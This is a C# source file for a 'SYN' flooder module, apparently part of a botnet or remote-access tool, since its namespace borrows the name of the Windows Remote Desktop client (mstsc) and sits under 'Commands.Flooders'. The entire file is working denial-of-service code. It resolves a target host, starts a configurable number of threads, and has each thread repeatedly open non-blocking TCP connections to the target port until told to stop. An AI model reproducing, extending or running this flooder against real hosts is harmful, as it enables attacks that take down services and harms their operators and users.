using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace mstsc.Aries.Commands.Flooders
{
    sealed class SYN
    {
        private static ThreadStart[] tFloodingJob;
        private static Thread[] tFloodingThread;
        public static string sFHost;
        private static IPAddress IPEo;
        public static int uPort;
        private static SYNRequest[] SYNClass;
        public static int iThreads;

        private static bool killThread;

        public static void StartSYNFlood()
        {
            //try
            //{
            killThread = false;
            try
            {
                IPEo = Dns.GetHostEntry(new Uri(sFHost).Host).AddressList[0];
            }
            catch
            {
                IPEo = IPAddress.Parse(sFHost);
            }

            tFloodingThread = new Thread[iThreads];
            tFloodingJob = new ThreadStart[iThreads];
            SYNClass = new SYNRequest[iThreads];

            for (int i = 0; i < iThreads; i++)
            {
                SYNClass[i] = new SYNRequest(IPEo, uPort);
                tFloodingJob[i] = new ThreadStart(SYNClass[i].Send);
                tFloodingThread[i] = new Thread(tFloodingJob[i]);
                tFloodingThread[i].Start();
            }
            //}
            // catch (Exception ex) { System.Windows.Forms.MessageBox.Show(ex.ToString() + "\n\n\n" + ex.Message); }
        }

        public static void StopSYNFlood()
        {
            killThread = true;
            for (int i = 0; i < iThreads; i++)
            {
                try
                {
                    tFloodingThread[i].Join(1000);
                }
                catch { } //(Exception Exception) { System.Windows.Forms.MessageBox.Show(Exception.ToString() + "\n\n\n" + Exception.Message); }
            }
        }

        private class SYNRequest
        {
            private IPAddress IPEo;
            private int Port;

            public SYNRequest(IPAddress tIPEo, int Port)
            {
                IPEo = tIPEo;
                this.Port = Port;
            }

            public void Send()
            {
                    try
                    {
                        while (!killThread)
                        {
                            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                            socket.Blocking = false;
                            socket.NoDelay = true;

                            socket.BeginConnect(IPEo, Port, null, socket);

                            Thread.Sleep(100);

                            if (socket.Connected) { socket.Disconnect(false); }
                            socket.Close();
                        }
                        if (killThread) { Thread.CurrentThread.Join(1000); }
                    }
                    catch { }// (Exception ex) { System.Windows.Forms.MessageBox.Show(ex.ToString() + "\n\n\n" + ex.Message); }
                }
        }
    }
}